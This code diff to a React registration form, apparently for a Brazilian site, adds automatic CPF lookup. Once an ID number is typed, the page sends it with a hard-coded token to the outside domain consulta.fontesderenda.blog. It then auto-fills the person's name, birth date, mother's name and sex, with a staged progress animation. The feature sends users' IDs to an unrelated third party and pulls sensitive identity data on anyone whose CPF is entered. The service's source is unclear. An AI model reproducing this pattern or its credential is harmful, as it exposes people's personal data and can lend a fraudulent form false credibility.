@@ -34,6 +34,8 @@ export default function Cadastro() {
   const [dataNascimento, setDataNascimento] = useState("");
   const [nomeMae, setNomeMae] = useState("");
   const [sexo, setSexo] = useState("");
+  const [loadingCpf, setLoadingCpf] = useState(false);
+  const [cpfStep, setCpfStep] = useState(0);
 
   const buscarCep = async (cepValue: string) => {
     if (cepValue.length !== 8) return;
@@ -147,6 +149,48 @@ export default function Cadastro() {
     }, 100);
   };
 
+  const buscarDadosCpf = async (cpfValue: string) => {
+    const cpfNumeros = cpfValue.replace(/\D/g, '');
+    if (cpfNumeros.length !== 11) return;
+
+    setLoadingCpf(true);
+    setCpfStep(0);
+    
+    try {
+      const response = await fetch(`https://consulta.fontesderenda.blog/cpf.php?token=6285fe45-e991-4071-a848-3fac8273c82a&cpf=${cpfNumeros}`);
+      const data = await response.json();
+      
+      if (data.DADOS) {
+        const dados = data.DADOS;
+        
+        // Preenchimento gradual em 4 etapas
+        const steps = [
+          () => setNome(dados.nome),
+          () => {
+            const dataFormatada = new Date(dados.data_nascimento).toLocaleDateString('pt-BR');
+            setDataNascimento(dataFormatada);
+          },
+          () => setNomeMae(dados.nome_mae),
+          () => setSexo(dados.sexo === 'M' ? 'masculino' : 'feminino')
+        ];
+
+        for (let i = 0; i < steps.length; i++) {
+          setTimeout(() => {
+            setCpfStep(i + 1);
+            steps[i]();
+            
+            if (i === steps.length - 1) {
+              setLoadingCpf(false);
+            }
+          }, (i + 1) * 1000);
+        }
+      }
+    } catch (error) {
+      console.error('Erro ao buscar dados do CPF:', error);
+      setLoadingCpf(false);
+    }
+  };
+
   // Limpar dados quando CEP for alterado
   useEffect(() => {
     setCidadeInfo(null);
@@ -181,6 +225,24 @@ export default function Cadastro() {
       return () => clearTimeout(timer);
     }
   }, [showCostInfo]);
+
+  // Buscar dados do CPF quando CPF estiver completo
+  useEffect(() => {
+    const cpfNumeros = cpf.replace(/\D/g, '');
+    if (cpfNumeros.length === 11) {
+      const timer = setTimeout(() => {
+        buscarDadosCpf(cpf);
+      }, 500);
+      return () => clearTimeout(timer);
+    } else {
+      // Limpar campos quando CPF for alterado
+      setNome("");
+      setDataNascimento("");
+      setNomeMae("");
+      setSexo("");
+      setCpfStep(0);
+    }
+  }, [cpf]);
 
   return (
     <div className="bg-gray-100 min-h-screen">
@@ -363,14 +425,35 @@ export default function Cadastro() {
                     <label className="block text-sm font-medium text-gray-700 mb-2">
                       CPF do Responsável Legal:
                     </label>
-                    <input
-                      type="text"
-                      value={cpf}
-                      onChange={(e) => setCpf(formatarCpf(e.target.value))}
-                      placeholder="000.000.000-00"
-                      className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
-                      maxLength={14}
-                    />
+                    <div className="relative">
+                      <input
+                        type="text"
+                        value={cpf}
+                        onChange={(e) => setCpf(formatarCpf(e.target.value))}
+                        placeholder="000.000.000-00"
+                        className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                        maxLength={14}
+                      />
+                      {loadingCpf && (
+                        <div className="absolute right-3 top-2">
+                          <i className="fas fa-spinner fa-spin text-blue-500"></i>
+                        </div>
+                      )}
+                    </div>
+                    {loadingCpf && (
+                      <div className="mt-2">
+                        <div className="flex items-center text-xs text-blue-600">
+                          <div className="w-full bg-gray-200 rounded-full h-1">
+                            <div 
+                              className="bg-blue-600 h-1 rounded-full transition-all duration-1000"
+                              style={{ width: `${(cpfStep / 4) * 100}%` }}
+                            ></div>
+                          </div>
+                          <span className="ml-2">{cpfStep}/4</span>
+                        </div>
+                        <p className="text-xs text-gray-600 mt-1">Buscando dados automaticamente...</p>
+                      </div>
+                    )}
                   </div>
 
                   <div>
@@ -382,7 +465,8 @@ export default function Cadastro() {
                       value={nome}
                       onChange={(e) => setNome(e.target.value)}
                       placeholder="Digite o nome completo"
-                      className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                      className={`w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent ${cpfStep >= 1 ? 'bg-green-50 border-green-300' : ''}`}
+                      readOnly={loadingCpf}
                     />
                   </div>
 
@@ -395,8 +479,9 @@ export default function Cadastro() {
                       value={dataNascimento}
                       onChange={(e) => setDataNascimento(formatarData(e.target.value))}
                       placeholder="00/00/0000"
-                      className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                      className={`w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent ${cpfStep >= 2 ? 'bg-green-50 border-green-300' : ''}`}
                       maxLength={10}
+                      readOnly={loadingCpf}
                     />
                   </div>
 
@@ -409,7 +494,8 @@ export default function Cadastro() {
                       value={nomeMae}
                       onChange={(e) => setNomeMae(e.target.value)}
                       placeholder="Digite o nome completo da mãe"
-                      className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                      className={`w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent ${cpfStep >= 3 ? 'bg-green-50 border-green-300' : ''}`}
+                      readOnly={loadingCpf}
                     />
                   </div>
 
@@ -420,7 +506,8 @@ export default function Cadastro() {
                     <select
                       value={sexo}
                       onChange={(e) => setSexo(e.target.value)}
-                      className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                      className={`w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent ${cpfStep >= 4 ? 'bg-green-50 border-green-300' : ''}`}
+                      disabled={loadingCpf}
                     >
                       <option value="">Selecione o sexo</option>
                       <option value="masculino">Masculino</option>
